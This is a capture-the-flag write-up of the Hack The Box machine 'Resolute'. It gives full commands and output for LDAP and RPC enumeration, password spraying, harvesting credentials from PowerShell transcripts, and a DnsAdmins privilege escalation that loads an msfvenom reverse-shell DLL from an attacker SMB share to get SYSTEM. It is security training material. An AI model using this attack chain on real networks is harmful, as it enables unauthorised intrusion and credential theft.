---
title: "Hack The Box: Resolute"
date: 2025-11-26
summary: "A Medium Windows-based machine where the target is compromised by extracting a default password from an LDAP description and spraying it for initial WinRM access. Enumerating hidden PowerShell transcription logs reveals credentials for a user in the DnsAdmins group. Privileges are then escalated to SYSTEM by abusing dnscmd.exe to register a malicious DLL plugin and restarting the DNS service."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Resolute"
tags:
  - active-directory
  - credentials-in-descriptions
  - credentials-in-powershell-history
  - dnsadmins
  - dnscmd
  - evil-winrm
  - hidden-files
  - impacket-smbserver
  - lolbas
  - metasploit
  - msfvenom
  - netexec
  - nmap
  - password-is-username
  - password-spraying
  - reverse-shell
  - rpcclient
  - sc
---

### Provided Information

Attacker IP: 10.10.14.125

Target IP: 10.129.19.150

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.19.150
Nmap scan report for 10.129.19.150
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2025-11-26 09:15:48 +04 for -3140s
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-26 04:22:54Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 1h46m58s, deviation: 4h37m10s, median: -53m03s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2025-11-25T20:23:14-08:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59265/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13534/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18307/udp): CLEAN (Timeout)
|   Check 4 (port 17831/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-11-26T04:23:13
|_  start_date: 2025-11-26T04:18:53
<SNIP>
```

The target is a domain controller given the running services. Nothing too interesting is seen.

### Enumerating SMB

Let’s start by using `netexec` to create a hosts file for `/etc/hosts`:

```bash
$ netexec smb 10.129.19.150 --generate-hosts-file hosts
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)

$ cat hosts | sudo tee -a /etc/hosts
10.129.19.150     RESOLUTE.megabank.local megabank.local RESOLUTE
```

Now let’s enumerate SMB shares using null/guest account:

```bash
$ netexec smb megabank.local -u '' -p '' --shares
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [+] megabank.local\:
SMB         10.129.19.150   445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED

$ netexec smb megabank.local -u guest -p '' --shares
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\guest: STATUS_ACCOUNT_DISABLED
```

Both failed. Null authentication is allowed but it can’t access shares. Guest account is disabled.

### Enumerating RPC

Let’s enumerate domain users using `rpcclient`:

```bash
$ rpcclient -U "" -N megabank.local
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

Nice, we got a collection of users.

Let’s filter for the usernames and store them:

```bash
$ cat rpc_users_unfiltered | cut -d '[' -f 2 | cut -d ']' -f 1 > domain_users

$ cat domain_users
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Let’s check if any of them is AS-REProastable using `impacket-GetNPUsers`:

```bash
$ impacket-GetNPUsers megabank.local/ -usersfile domain_users -outputfile asreproasting.hashes -dc-ip 10.129.19.150

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No luck.

### Enumerating LDAP

Let’s dump the domain data using `netexec`:

```bash
$ netexec ldap megabank.local -u '' -p '' --query "(objectClass=*)" "" > ldap_dump
```

Then let’s filter for descriptions as they sometimes hold credentials:

```bash
$ cat ldap_dump | grep -ia description
<SNIP>
LDAP                     10.129.19.150   389    RESOLUTE         description          Account created. Password set to Wel<REDACTED>
```

Interesting, a password.

Let’s check its associated username:

```bash
$ cat ldap_dump | grep -ia 'Wel<REDACTED>' -C 20 | grep -i samaccountname
LDAP                     10.129.19.150   389    RESOLUTE         sAMAccountName       ryan
```

So the password is found in Ryan’s description.

Let’s check if the credentials are valid:

```bash
$ netexec smb megabank.local -u ryan -p 'Wel<REDACTED>'
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\ryan:Wel<REDACTED> STATUS_LOGON_FAILURE
```

They aren’t.

### Password Spraying and Exploiting Melanie

Since this seems to be a default password, let’s spray it among all identified users to identify a match:

```bash
$ netexec smb megabank.local -u domain_users -p 'Wel<REDACTED>' --continue-on-success
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\Administrator:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\Guest:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\krbtgt:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\DefaultAccount:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\ryan:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\marko:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\sunita:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\abigail:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\marcus:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\sally:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\fred:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\angela:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\felicia:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\gustavo:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\ulf:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\stevie:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\claire:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\paulo:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\steve:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\annette:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\annika:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\per:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\claude:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [+] megabank.local\melanie:Wel<REDACTED>
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\zach:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\simon:Wel<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.19.150   445    RESOLUTE         [-] megabank.local\naoki:Wel<REDACTED> STATUS_LOGON_FAILURE
```

Nice, we got one match on the user Melanie.

Let’s check what SMB shares can it access:

```bash
$ netexec smb megabank.local -u melanie -p 'Wel<REDACTED>' --shares
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [+] megabank.local\melanie:Wel<REDACTED>
SMB         10.129.19.150   445    RESOLUTE         [*] Enumerated shares
SMB         10.129.19.150   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.19.150   445    RESOLUTE         -----           -----------     ------
SMB         10.129.19.150   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.19.150   445    RESOLUTE         C$                              Default share
SMB         10.129.19.150   445    RESOLUTE         IPC$            READ            Remote IPC
SMB         10.129.19.150   445    RESOLUTE         NETLOGON        READ            Logon server share
SMB         10.129.19.150   445    RESOLUTE         SYSVOL          READ            Logon server share
```

Default shares, nothing too interesting.

### RCE as Melanie

Let’s check if the user can WinRM:

```bash
$ netexec winrm megabank.local -u melanie -p 'Wel<REDACTED>'
WINRM       10.129.19.150   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.129.19.150   5985   RESOLUTE         [+] megabank.local\melanie:Wel<REDACTED> (Pwn3d!)
```

Perfect, it can.

Let’s use `evil-winrm` to establish a shell and read `user.txt`:

```bash
$ evil-winrm -i megabank.local -u melanie -p Wel<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop> ls

    Directory: C:\Users\melanie\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/25/2025   8:19 PM             34 user.txt

*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
22f17f<REDACTED>
```

### Basic Enumeration on Melanie

Melanie doesn’t have anything special regarding permissions and groups:

```bash
*Evil-WinRM* PS C:\Users\melanie\Desktop> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ===============================================
megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

The `Users` directory shows nothing too impressive, but there is another user called Ryan who has a home directory (same as the one identified in the LDAP dump):

```bash
*Evil-WinRM* PS C:\Users\melanie\Desktop> cd ../../
*Evil-WinRM* PS C:\Users> tree . /F
Folder PATH listing
Volume serial number is D1AC-5AF6
C:\USERS
ÃÄÄÄAdministrator
ÃÄÄÄmelanie
³   ÃÄÄÄDesktop
³   ³       user.txt
³   ³
³   ÃÄÄÄDocuments
³   ÃÄÄÄDownloads
³   ÃÄÄÄFavorites
³   ÃÄÄÄLinks
³   ÃÄÄÄMusic
³   ÃÄÄÄPictures
³   ÃÄÄÄSaved Games
³   ÀÄÄÄVideos
ÃÄÄÄPublic
ÀÄÄÄryan
```

### Exploiting Ryan

There is a hidden directory in the system’s root directory:

```bash
*Evil-WinRM* PS C:\Users\melanie\Documents> cd /
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       11/25/2025   8:18 PM      402653184 pagefile.sys
```

Let’s check its contents:

```bash
*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> ls -force

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Interesting, a powershell transcript file.

Let’s read its contents:

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

<SNIP>
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Ser<REDACTED>
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
<SNIP>
```

Nice, credentials were identified for Ryan!

Let’s validate them:

```bash
$ netexec smb megabank.local -u ryan -p Ser<REDACTED>
SMB         10.129.19.150   445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.19.150   445    RESOLUTE         [+] megabank.local\ryan:Ser<REDACTED> (Pwn3d!)
```

Not only they work, but Ryan seems to have some kind of admin privileges!

### RCE as Ryan

Let’s check if Ryan can WinRM:

```bash
$ netexec winrm megabank.local -u ryan -p Ser<REDACTED>
WINRM       10.129.19.150   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.129.19.150   5985   RESOLUTE         [+] megabank.local\ryan:Ser<REDACTED (Pwn3d!)
```

Nice.

Let’s use `evil-winrm` to establish a shell:

```bash
$ evil-winrm -i megabank.local -u ryan -p Ser<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

### Basic Enumeration on Ryan

There is an interesting note in Ryan’s desktop:

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ../../
*Evil-WinRM* PS C:\Users> tree . /F
Folder PATH listing
Volume serial number is D1AC-5AF6
C:\USERS
ÃÄÄÄAdministrator
ÃÄÄÄmelanie
ÃÄÄÄPublic
ÀÄÄÄryan
    ÃÄÄÄDesktop
    ³       note.txt
    ³
    ÃÄÄÄDocuments
    ÃÄÄÄDownloads
    ÃÄÄÄFavorites
    ÃÄÄÄLinks
    ÃÄÄÄMusic
    ÃÄÄÄPictures
    ÃÄÄÄSaved Games
    ÀÄÄÄVideos
```

```bash
*Evil-WinRM* PS C:\Users> cat ryan/desktop/note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

This suggests that any system changes will be wiped in one minute, likely periodically.

### DnsAdmins

Continuing basic enumeration on Ryan, it can be seen that the user is part of an interesting group:

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### LOLBAS Dnscmd.exe

[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) shows that `dnscmd.exe` can be used to escalate privileges if the user is part of the DnsAdmins group, which is exactly the case in this scenario:

> **Execute**
> 
> 
> Adds a specially crafted DLL as a plug-in of the DNS Service.
> This command must be run on a DC by a user that is at least a member of
> the DnsAdmins group.
> 
> ```
> dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\servername\C$\Windows\Temp\file.dll
> ```
> 

Let’s use this method to escalate privileges.

### RCE as Administrator

First, let’s create a malicious DLL file that returns a reverse shell using `msfvenom`:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.125 LPORT=4444 -f dll -o rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: rev.dll
```

Next, let’s start an SMB server in the same directory:

```bash
$ impacket-smbserver share .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

And let’s start `metasploit` and configure mutli/handler listener:

```bash
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.125; set LPORT 4444; run"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
LHOST => 10.10.14.125
LPORT => 4444
[*] Started reverse TCP handler on 10.10.14.125:4444
```

Now to escalate privileges, let’s add the DLL as a plugin to the DNS and restart it. This should be done quick (in less than 1 minute):

```bash
*Evil-WinRM* PS C:\Users> dnscmd.exe  /config /serverlevelplugindll \\10.10.14.125\share\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        
*Evil-WinRM* PS C:\Users> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2312
        FLAGS              :
```

SMB server received a request, and `metasploit` caught the shell successfully:

```bash
[*] Started reverse TCP handler on 10.10.14.125:4444
[*] Sending stage (203846 bytes) to 10.129.19.150
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (10.10.14.125:4444 -> 10.129.19.150:54289) at 2025-11-26 10:15:51 +0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The `root.txt` flag can be found in the Administrator’s desktop:

```bash
meterpreter > shell
Process 1820 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /users/administrator/desktop
cd /users/administrator/desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D1AC-5AF6

 Directory of C:\Users\Administrator\Desktop

12/04/2019  05:18 AM    <DIR>          .
12/04/2019  05:18 AM    <DIR>          ..
11/25/2025  08:19 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,448,302,080 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
7d5438<REDACTED>
```
